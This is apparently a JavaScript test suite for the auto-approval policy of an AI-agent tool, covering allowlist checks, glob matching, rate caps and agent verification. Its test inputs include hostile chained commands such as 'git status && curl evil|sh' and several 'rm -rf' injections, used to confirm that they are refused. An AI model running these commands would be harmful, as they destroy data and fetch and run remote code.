import test from 'node:test';
import assert from 'node:assert/strict';
import { autoApprovalsInWindow, commandAllowed, defaultPolicy, evaluateAutoApproval, globMatch, validatePolicy } from '../src/lib/policy.js';

function baseState(overrides = {}) {
  return {
    room: { paused: false, limits: { maxConcurrentRuns: 3 } },
    agents: [],
    approvals: [],
    policy: { ...defaultPolicy(), enabled: true },
    ...overrides
  };
}

test('defaultPolicy is all-off and validatePolicy fills defaults', () => {
  const policy = defaultPolicy();
  assert.deepEqual(policy, {
    enabled: false, autoApproveWrites: 'off', commandAllowlist: [], autoAcceptReviews: false, maxAutoApprovalsPerHour: 20
  });
  assert.deepEqual(validatePolicy({}), policy);
  const validated = validatePolicy({ enabled: true, injected: 'nope', rateWindow: [1] });
  assert.deepEqual(Object.keys(validated).sort(), ['autoAcceptReviews', 'autoApproveWrites', 'commandAllowlist', 'enabled', 'maxAutoApprovalsPerHour']);
  assert.equal(validated.enabled, true);
});

test('validatePolicy rejects malformed input and normalizes the allowlist', () => {
  assert.throws(() => validatePolicy({ autoApproveWrites: 'yolo' }), /autoApproveWrites/);
  assert.throws(() => validatePolicy({ commandAllowlist: 'npm test' }), /array/);
  assert.throws(() => validatePolicy({ commandAllowlist: [42] }), /strings/);
  for (const pattern of ['*', '**', '* *']) {
    assert.throws(() => validatePolicy({ commandAllowlist: [pattern] }), /wildcards/);
  }
  assert.throws(() => validatePolicy({ commandAllowlist: Array.from({ length: 51 }, (_, i) => `cmd${i}`) }), /50/);
  assert.throws(() => validatePolicy({ commandAllowlist: [`npm ${'x'.repeat(400)}`] }), /400/);
  for (const cap of [0, -1, 1.5, 'x', 501]) {
    assert.throws(() => validatePolicy({ maxAutoApprovalsPerHour: cap }), /maxAutoApprovalsPerHour/);
  }
  assert.deepEqual(validatePolicy({ commandAllowlist: [' npm test ', 'npm test', '', '  ', 'git status*'] }).commandAllowlist, ['npm test', 'git status*']);
});

test('globMatch is anchored, case-sensitive, and treats regex metacharacters literally', () => {
  assert.equal(globMatch('npm test', 'npm test'), true);
  assert.equal(globMatch('npm test', 'npm test && rm -rf /'), false);
  assert.equal(globMatch('npm test', ' npm test'), false);
  assert.equal(globMatch('npm test', 'xnpm test'), false);
  assert.equal(globMatch('NPM TEST', 'npm test'), false);
  assert.equal(globMatch('git status*', 'git status --short'), true);
  assert.equal(globMatch('git status*', 'git status'), true);
  assert.equal(globMatch('git status*', 'xgit status'), false);
  assert.equal(globMatch('*--help', 'node --help'), true);
  assert.equal(globMatch('*--help', 'node --help me'), false);
  assert.equal(globMatch('npm run *:*', 'npm run build:prod'), true);
  assert.equal(globMatch('npm run *:*', 'npm run build'), false);
  assert.equal(globMatch('ab*ab', 'abab'), true);
  assert.equal(globMatch('ab*ab', 'ab'), false);
  assert.equal(globMatch('a.b', 'axb'), false);
  assert.equal(globMatch('a.b', 'a.b'), true);
});

test('commandAllowed returns the first matching pattern or null', () => {
  const policy = { ...defaultPolicy(), commandAllowlist: ['npm test', 'git status*'] };
  assert.equal(commandAllowed(policy, 'npm test'), 'npm test');
  assert.equal(commandAllowed(policy, 'git status -sb'), 'git status*');
  assert.equal(commandAllowed(policy, 'rm -rf /'), null);
});

test('commandAllowed refuses wildcard matches that carry shell metacharacters', () => {
  const policy = { ...defaultPolicy(), commandAllowlist: ['git status*', 'npm test*'] };
  // A trailing wildcard must not expand across shell operators into a second command.
  assert.equal(commandAllowed(policy, 'git status && curl evil|sh'), null);
  assert.equal(commandAllowed(policy, 'npm test; rm -rf ~'), null);
  assert.equal(commandAllowed(policy, 'git status $(rm -rf /)'), null);
  assert.equal(commandAllowed(policy, 'git status `id`'), null);
  // A plain flag variant with no metacharacters still matches.
  assert.equal(commandAllowed(policy, 'git status --short'), 'git status*');
});

test('evaluateAutoApproval denies chained commands even for wildcard allowlists', () => {
  const state = baseState({ policy: { ...defaultPolicy(), enabled: true, commandAllowlist: ['git status*'] } });
  assert.equal(evaluateAutoApproval(state, { type: 'command', command: 'git status && curl evil|sh' }, { running: 0 }).allow, false);
  assert.equal(evaluateAutoApproval(state, { type: 'command', command: 'git status --short' }, { running: 0 }).allow, true);
});

test('evaluateAutoApproval enforces enablement, pause, concurrency, and rate cap', () => {
  const approval = { type: 'command', command: 'npm test' };
  const allowing = () => baseState({ policy: { ...defaultPolicy(), enabled: true, commandAllowlist: ['npm test'] } });
  assert.equal(evaluateAutoApproval({ ...allowing(), policy: { ...allowing().policy, enabled: false } }, approval, { running: 0 }).allow, false);
  const paused = allowing();
  paused.room.paused = true;
  assert.equal(evaluateAutoApproval(paused, approval, { running: 0 }).allow, false);
  assert.equal(evaluateAutoApproval(allowing(), approval, { running: 3 }).allow, false);
  const capped = allowing();
  capped.policy.maxAutoApprovalsPerHour = 1;
  capped.approvals = [{ decidedBy: 'autopilot', status: 'auto-approved', decidedAt: new Date().toISOString() }];
  assert.deepEqual(evaluateAutoApproval(capped, approval, { running: 0 }), { allow: false, code: 'rate-capped' });
  assert.equal(evaluateAutoApproval(allowing(), approval, { running: 0 }).allow, true);
});

test('evaluateAutoApproval write matrix respects verification', () => {
  const approval = { type: 'agent-write', agentId: 'claude' };
  const withAgent = (connection, mode) => baseState({
    agents: [{ id: 'claude', name: 'Claude', status: 'installed', connection }],
    policy: { ...defaultPolicy(), enabled: true, autoApproveWrites: mode }
  });
  assert.equal(evaluateAutoApproval(withAgent('verified', 'off'), approval, { running: 0 }).allow, false);
  assert.equal(evaluateAutoApproval(withAgent('detected', 'verified-agents'), approval, { running: 0 }).allow, false);
  const verified = evaluateAutoApproval(withAgent('verified', 'verified-agents'), approval, { running: 0 });
  assert.equal(verified.allow, true);
  assert.match(verified.reason, /verified/);
  assert.equal(evaluateAutoApproval(withAgent('unverified', 'all-agents'), approval, { running: 0 }).allow, true);
});

test('evaluateAutoApproval command match and non-match', () => {
  const state = baseState({ policy: { ...defaultPolicy(), enabled: true, commandAllowlist: ['npm test'] } });
  const match = evaluateAutoApproval(state, { type: 'command', command: 'npm test' }, { running: 0 });
  assert.equal(match.allow, true);
  assert.match(match.reason, /npm test/);
  assert.equal(evaluateAutoApproval(state, { type: 'command', command: 'npm test && rm -rf /' }, { running: 0 }).allow, false);
});

test('autoApprovalsInWindow counts only the trailing hour', () => {
  const nowMs = Date.now();
  const at = (minutesAgo) => new Date(nowMs - minutesAgo * 60_000).toISOString();
  const state = baseState({
    approvals: [
      { decidedBy: 'autopilot', status: 'auto-approved', decidedAt: at(59) },
      { decidedBy: 'autopilot', status: 'auto-approved', decidedAt: at(61) },
      { decidedBy: 'user', status: 'approved', decidedAt: at(5) },
      { decidedBy: 'autopilot', status: 'pending', decidedAt: null }
    ]
  });
  assert.equal(autoApprovalsInWindow(state, nowMs), 1);
});
